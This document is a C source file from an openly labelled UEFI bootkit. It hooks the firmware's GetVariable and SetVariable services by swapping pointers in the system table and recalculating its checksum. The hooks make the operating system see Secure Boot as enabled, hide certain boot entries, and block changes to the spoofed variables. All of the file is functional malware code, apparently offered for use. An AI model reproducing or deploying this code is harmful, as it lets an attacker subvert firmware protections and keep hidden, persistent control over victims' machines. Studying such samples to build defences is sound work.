/*
 * Copyright (C) 2022 xmmword
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include "Utils.h"
#include "Hooks.h"
#include "Config/Config.h"


/*
    *    src/bootkit/Hooks.c
    *    Date: 12/14/22
    *    Author: @xmmword
*/


EFI_GET_VARIABLE OriginalGetVariable; /* Function pointer that points to the GetVariable service. */
EFI_SET_VARIABLE OriginalSetVariable; /* Function pointer that points to the SetVariable service. */

EFI_EVENT SetVirtualAddressMapEventVar = NULL; /* Event variable for the SetVirtualAddressMap event. */

/**
 * @brief GetVariable Hook, spoofs the data that will be written back to the output buffer.
 * @param VariableName The UEFI variable name.
 * @param VendorGuid The GUID.
 * @param Attributes Attributes.
 * @param DataSize The size of the data.
 * @param Data Optional data.
 * @returns EFI_SUCCESS on success, EFI_FAILURE on failure.
 */

EFI_STATUS EFIAPI GetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid,
  OUT UINT32 *Attributes, OPTIONAL IN OUT UINTN *DataSize, OUT VOID *Data OPTIONAL)
{
#ifdef CONFIG_SPOOF_SECUREBOOT
  if (!StrnCmp(VariableName, L"SetupMode", (sizeof(L"SetupMode") / sizeof(CHAR16)))) {
    *(UINT8 *)Data = (UINT8)0, *DataSize = sizeof(UINT8);

    return EFI_SUCCESS;
  }

  if (!StrnCmp(VariableName, L"SecureBoot", (sizeof(L"SecureBoot") / sizeof(CHAR16)))) {
    *(UINT8 *)Data = (UINT8)1, *DataSize = sizeof(UINT8);

    return EFI_SUCCESS;
  }
#endif

  if (!StrnCmp(VariableName, L"Boot0002", (sizeof(L"Boot0002") / sizeof(CHAR16))))
    return EFI_SUCCESS;

  if (!StrnCmp(VariableName, L"Boot0005", (sizeof(L"Boot0005") / sizeof(CHAR16))))
    return EFI_SUCCESS;

  return OriginalGetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
}

/**
 * @brief SetVariable Hook, monitors the data that will be written back to the output buffer.
 * @param VariableName The UEFI variable name.
 * @param VendorGuid The GUID.
 * @param Attributes Attributes.
 * @param DataSize The size of the data.
 * @param Data Optional data.
 * @returns EFI_SUCCESS on success, EFI_FAILURE on failure.
 */

EFI_STATUS EFIAPI SetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid,
  IN UINT32 Attributes, IN UINTN DataSize, IN VOID *Data)
{
  /* Prevent the possible modification of our spoofed SecureBoot status. */

#ifdef CONFIG_SPOOF_SECUREBOOT
  if (!StrnCmp(VariableName, L"SetupMode", (sizeof(L"SetupMode") / sizeof(CHAR16))))
    return EFI_SUCCESS;

  if (!StrnCmp(VariableName, L"SecureBoot", (sizeof(L"SecureBoot") / sizeof(CHAR16))))
    return EFI_SUCCESS;
#endif

  if (!StrnCmp(VariableName, L"Boot0005", (sizeof(L"Boot0005") / sizeof(CHAR16))))
    return EFI_SUCCESS;

  return OriginalSetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
}

/**
 * @brief Swaps a pointer in the UEFI System Table with a target pointer.
 * @param Function The original function.
 * @param HookFunction The hook function.
 * @param Header The header of the table in which the pointer is located in.
 * @returns The pointer to the original function.
 */

VOID *HookPointer(VOID **Function, VOID *HookFunction, EFI_TABLE_HEADER *Header) {
  VOID *CachedFunction = *Function;

  CONST EFI_TPL RaiseReturnStatus = gBS->RaiseTPL(TPL_HIGH_LEVEL);
  Header->CRC32 = 0;

  *Function = HookFunction;

  gBS->CalculateCrc32((UINT8 *)Header, Header->HeaderSize, &Header->CRC32);
  gBS->RestoreTPL(RaiseReturnStatus);

  return CachedFunction;
}

/**
 * @brief Event for SetVirtualAddressMap that converts the function pointer for the original function to virtual mode.
 * @param EfiEvent The event.
 * @param Context The context.
 */

VOID EFIAPI VMapEvent(EFI_EVENT EfiEvent, VOID *Context) {
  gRT->ConvertPointer(0, (VOID **)&OriginalGetVariable);
  gRT->ConvertPointer(0, (VOID **)&OriginalSetVariable);

  SetVirtualAddressMapEventVar = NULL;
}